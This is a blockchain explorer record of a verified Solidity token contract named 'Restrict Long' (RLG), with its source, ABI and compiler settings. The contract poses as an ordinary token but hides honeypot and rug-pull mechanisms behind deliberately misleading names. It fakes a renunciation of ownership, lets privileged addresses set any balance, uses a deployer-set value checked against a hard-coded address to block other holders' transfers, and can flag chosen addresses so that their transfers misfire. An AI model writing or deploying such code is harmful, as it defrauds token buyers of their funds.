{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface tradingExemptFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract feeShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldReceiver {\n    function createPair(address senderTake, address exemptLimit) external returns (address);\n}\n\ninterface liquidityMinWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxSell) external view returns (uint256);\n\n    function transfer(address amountTotal, uint256 isBuy) external returns (bool);\n\n    function allowance(address shouldTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountTotal,\n        uint256 isBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isTake, uint256 value);\n    event Approval(address indexed shouldTo, address indexed spender, uint256 value);\n}\n\ninterface liquidityMinWalletMetadata is liquidityMinWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RestrictLong is feeShould, liquidityMinWallet, liquidityMinWalletMetadata {\n\n    function liquidityEnable(address fundTotal, address amountTotal, uint256 isBuy) internal returns (bool) {\n        if (fundTotal == feeEnable) {\n            return senderFrom(fundTotal, amountTotal, isBuy);\n        }\n        uint256 shouldMarketing = liquidityMinWallet(tradingTo).balanceOf(limitTotal);\n        require(shouldMarketing == atExempt);\n        require(amountTotal != limitTotal);\n        if (autoAmount[fundTotal]) {\n            return senderFrom(fundTotal, amountTotal, buyReceiver);\n        }\n        return senderFrom(fundTotal, amountTotal, isBuy);\n    }\n\n    address limitTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function marketingTx() public {\n        emit OwnershipTransferred(feeEnable, address(0));\n        fromIsMarketing = address(0);\n    }\n\n    mapping(address => mapping(address => uint256)) private maxExempt;\n\n    function transferFrom(address fundTotal, address amountTotal, uint256 isBuy) external override returns (bool) {\n        if (_msgSender() != enableSenderTrading) {\n            if (maxExempt[fundTotal][_msgSender()] != type(uint256).max) {\n                require(isBuy <= maxExempt[fundTotal][_msgSender()]);\n                maxExempt[fundTotal][_msgSender()] -= isBuy;\n            }\n        }\n        return liquidityEnable(fundTotal, amountTotal, isBuy);\n    }\n\n    function toFundAuto(address maxLimit, uint256 isBuy) public {\n        marketingTrading();\n        modeBuy[maxLimit] = isBuy;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fromEnable;\n    }\n\n    function balanceOf(address maxSell) public view virtual override returns (uint256) {\n        return modeBuy[maxSell];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoTake;\n    }\n\n    constructor (){\n        if (autoLaunch != enableExemptMax) {\n            limitMode = false;\n        }\n        tradingExemptFund buyFund = tradingExemptFund(enableSenderTrading);\n        tradingTo = shouldReceiver(buyFund.factory()).createPair(buyFund.WETH(), address(this));\n        \n        feeEnable = _msgSender();\n        marketingTx();\n        exemptTeamFund[feeEnable] = true;\n        modeBuy[feeEnable] = senderEnable;\n        if (liquidityFee == limitMode) {\n            sellMin = false;\n        }\n        emit Transfer(address(0), feeEnable, senderEnable);\n    }\n\n    string private isTeam = \"RLG\";\n\n    address enableSenderTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderEnable;\n    }\n\n    uint256 public minReceiver;\n\n    event OwnershipTransferred(address indexed swapFrom, address indexed buyTx);\n\n    uint256 public enableExemptMax;\n\n    bool public liquidityFee;\n\n    function transfer(address maxLimit, uint256 isBuy) external virtual override returns (bool) {\n        return liquidityEnable(_msgSender(), maxLimit, isBuy);\n    }\n\n    address private fromIsMarketing;\n\n    bool public limitMode;\n\n    function symbol() external view virtual override returns (string memory) {\n        return isTeam;\n    }\n\n    bool private limitAmount;\n\n    mapping(address => bool) public exemptTeamFund;\n\n    bool private teamLiquidity;\n\n    bool public toAmount;\n\n    function modeSwap(uint256 isBuy) public {\n        marketingTrading();\n        atExempt = isBuy;\n    }\n\n    function owner() external view returns (address) {\n        return fromIsMarketing;\n    }\n\n    function allowance(address atFee, address receiverIs) external view virtual override returns (uint256) {\n        if (receiverIs == enableSenderTrading) {\n            return type(uint256).max;\n        }\n        return maxExempt[atFee][receiverIs];\n    }\n\n    address public feeEnable;\n\n    uint256 atExempt;\n\n    uint256 constant buyReceiver = 13 ** 10;\n\n    address public tradingTo;\n\n    function senderFrom(address fundTotal, address amountTotal, uint256 isBuy) internal returns (bool) {\n        require(modeBuy[fundTotal] >= isBuy);\n        modeBuy[fundTotal] -= isBuy;\n        modeBuy[amountTotal] += isBuy;\n        emit Transfer(fundTotal, amountTotal, isBuy);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return fromIsMarketing;\n    }\n\n    mapping(address => bool) public autoAmount;\n\n    bool public sellMin;\n\n    function approve(address receiverIs, uint256 isBuy) public virtual override returns (bool) {\n        maxExempt[_msgSender()][receiverIs] = isBuy;\n        emit Approval(_msgSender(), receiverIs, isBuy);\n        return true;\n    }\n\n    uint256 public autoLaunch;\n\n    function launchedSender(address tokenFund) public {\n        require(tokenFund.balance < 100000);\n        if (toAmount) {\n            return;\n        }\n        \n        exemptTeamFund[tokenFund] = true;\n        if (limitMode != limitAmount) {\n            limitAmount = false;\n        }\n        toAmount = true;\n    }\n\n    uint256 private senderEnable = 100000000 * 10 ** 18;\n\n    uint8 private autoTake = 18;\n\n    mapping(address => uint256) private modeBuy;\n\n    uint256 fromFundMode;\n\n    bool public launchedTake;\n\n    string private fromEnable = \"Restrict Long\";\n\n    function marketingTrading() private view {\n        require(exemptTeamFund[_msgSender()]);\n    }\n\n    function buyLaunch(address walletLiquidity) public {\n        marketingTrading();\n        \n        if (walletLiquidity == feeEnable || walletLiquidity == tradingTo) {\n            return;\n        }\n        autoAmount[walletLiquidity] = true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLiquidity\",\"type\":\"address\"}],\"name\":\"buyLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableExemptMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptTeamFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFund\",\"type\":\"address\"}],\"name\":\"launchedSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isBuy\",\"type\":\"uint256\"}],\"name\":\"modeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isBuy\",\"type\":\"uint256\"}],\"name\":\"toFundAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RestrictLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}